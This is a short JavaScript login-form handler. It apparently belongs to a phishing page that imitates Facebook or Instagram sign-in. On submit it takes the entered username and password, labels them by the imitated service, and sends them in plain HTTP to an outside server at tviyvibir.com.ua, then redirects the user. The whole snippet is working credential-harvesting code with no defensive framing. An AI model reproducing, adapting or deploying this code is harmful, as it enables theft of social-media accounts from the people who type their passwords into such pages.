const form = document.querySelector('form')
form.addEventListener("submit", (e) => {
    e.preventDefault();
    const username = form.elements['username'].value;
    const password = form.elements['password'].value;

    const body = JSON.stringify({
        username,
        password,
        messanger: location.pathname.indexOf('facebook') !== -1 ? 'facebook' : 'instagram'
    })


    if (username && password) {
        fetch('http://tviyvibir.com.ua/api/auth/login', {
            method: 'POST',
            body: body,
            headers: new Headers({ "Content-Type": "application/json" })
        }).then((response) => {

            if (response.ok) {
                location.href = '/';
                localStorage.setItem('isAuthed', true);
                localStorage.setItem('username', username);
            }
        })
    }
});